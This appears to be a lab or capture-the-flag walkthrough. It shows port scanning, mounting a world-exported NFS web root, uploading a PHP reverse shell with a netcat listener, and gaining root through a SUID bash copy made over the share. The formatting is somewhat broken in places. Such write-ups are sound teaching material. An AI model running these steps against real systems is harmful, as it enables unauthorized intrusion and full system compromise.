# 🔍 Network Discovery

First, scan the local network to identify active hosts using `arp-scan`.

```bash
$ sudo arp-scan  --localnet

Perform a full TCP port scan:

```bash
$ nmap -n -Pn -sSV -p- --min-rate 5000  192.168.29.79

### Findings
- Port **22** → SSH
- Port **80** → HTTP
- Port **2049** → NFS
- Additional RPC/NFS-related services are also running

The NFS service appeared especially interesting and potentially vulnerable.

## Result

```text
index.html
```

No additional directories or sensitive files were discovered.

---

# 🔍 NFS Enumeration

Since NFS was running, enumerate exported shares using `showmount`.

```bash
showmount -e 192.168.29.79
```

## Result

```text
Export list for 192.168.29.79:
/var/www/html *
```

### Important Finding
The web root directory `/var/www/html` was exported through NFS and accessible to everyone.

---

# 📁 Mounting the NFS Share

Become root on the local attacker machine:

```bash
su -
```

Create a temporary directory for mounting:

```bash
mkdir /tmp/nfs
cd /tmp/nfs
```

Mount the NFS share:

```bash
mount -t nfs 192.168.29.79:/var/www/html/ /tmp/nfs/
```

Verify the mounted contents:

```bash
ls
```

## Result

```text
index.html
```

Successfully mounted the remote NFS share.

---

# 💣 Reverse Shell Upload

Generate a PHP reverse shell using:

- https://www.revshells.com/

Selected payload:
- **PHP PentestMonkey**

Configure:
- Attacker IP
- Port `443`

Save the payload as:

```text
shell.php
```

Place the file inside the mounted NFS directory.

Verify upload:

```bash
# ls
index.html  shell.php

```

---

# 🎧 Netcat Listener

Start a Netcat listener on the attacker machine:

```bash
nc -lvnp 443
```

---

# 🚀 Remote Code Execution

Trigger the reverse shell from the browser:

```text
http://192.168.29.79/shell.php
```
<img width="1195" height="448" alt="Screenshot 2026-05-11 211200" src="https://github.com/user-attachments/assets/b960111c-93fc-4a29-a329-1170e5c00130" />
<br>
On the Netcat session:

```
$ nc -lnvp 443                                       
listening on [any] 443 ...

# 🖥 Initial Access

## Verify User

```bash
id ; hostname
whoami
```

## Result

```bash
uid=1000(low) gid=1000(low) groups=1000(low)
lower3

low
```

Successfully gained access as user `low`.

---

# 🔍 Writable Web Directory

Navigate to the web root directory:

```bash
cd /var/www/
ls -la
total 12
drwxr-xr-x  3 low  low  4096 Mar  9  2025 .
drwxr-xr-x 12 root root 4096 Jun 12  2023 ..
drwxrwxrwx  2 low  low  4096 May 11 16:43 html
```

### Important Finding
The `html` directory is world-writable.

---

# ⚠️ Privilege Escalation via SUID Bash

Copy `/bin/bash` into the writable directory and verify it:

```bash
cp /bin/bash /var/www/html/
```

Verify:

```bash
$ cp /bin/bash 
$ ls -la
total 1232
drwxrwxrwx 2 low  low     4096 May 11 16:43 .
drwxr-xr-x 3 low  low     4096 Mar  9  2025 ..
-rwxr-xr-x 1 low  low  1234376 May 11 16:43 bash
-rw------- 1 low  low    10701 Jun 12  2023 index.html
-rw-rw-r-- 1 root root    2586 May 11 16:36 shell.php
```

---

# 🔧 Modifying File Permissions

From the attacker's root terminal:

```bash
chown root:root bash
chmod u+s bash
```

### Explanation
- `chown root:root bash`
  - Makes `root` the owner of the file

- `chmod u+s bash`
  - Sets the SUID bit, causing the binary to execute with root privileges

---

# ✅ Verify SUID Permissions

Back in the reverse shell:

```bash
ls -la
total 2440
drwxrwxrwx 2 low  low     4096 May 11 16:43 .
drwxr-xr-x 3 low  low     4096 Mar  9  2025 ..
-rwsr-xr-x 1 root root 1234376 May 11 16:43 bash
-rw------- 1 low  low    10701 Jun 12  2023 index.html
-rw-rw-r-- 1 root root    2586 May 11 16:36 shell.php
```

## Result

```bash
-rwsr-xr-x 1 root root 1234376 bash
```

The SUID bit is successfully set.

---

# 👑 Privilege Escalation

Execute the SUID bash binary:

```bash
./bash -p
```

Verify privileges:

```bash
$ ./bash -p
whoami
root
```

## Result

```text
root
```

Successfully escalated privileges to root.

---

# 🏁 Flags

```

---

```bash
cat /home/low/user.txt
```

```text

```

---

# 👑 Root Flag

```bash
cat /root/root.txt
```

## NFS (Network File System) 
```
NFS (Network File System) is a protocol used in Linux/Unix systems
that allows a server to share files and directories with other systems
over a network as if they were local files. It commonly runs on port `2049`
along with RPC services on port `111`. Administrators configure
shared directories inside the `/etc/exports` file, where permissions
such as read/write access are defined. During penetration testing,
NFS is important because misconfigured shares can expose
sensitive files or allow attackers to upload malicious files.
A dangerous configuration is `no_root_squash`,
which allows a remote root user to keep root privileges on the mounted share,
potentially leading to full system compromise through techniques
such as uploading reverse shells or creating SUID binaries.
Attackers usually enumerate NFS shares using `showmount -e <IP>` and
 mount them locally using `mount -t nfs <IP>:/share /mnt/nfs`.
```

# 🧾 Summary

| Phase | Technique |
|------|-----------|
| Network Discovery | arp-scan |
| Enumeration | Nmap |
| NFS Enumeration | showmount |
| Initial Access | PHP Reverse Shell |
| Remote Code Execution | Writable Web Root |
| Privilege Escalation | SUID Bash |

---

# 🚀 Key Takeaways

- Misconfigured NFS shares can expose critical directories.
- Exporting a web root through NFS is extremely dangerous.
- Writable web directories can lead directly to Remote Code Execution.
- SUID binaries are a powerful privilege escalation vector.
- Always check mount permissions and exported shares during enumeration.
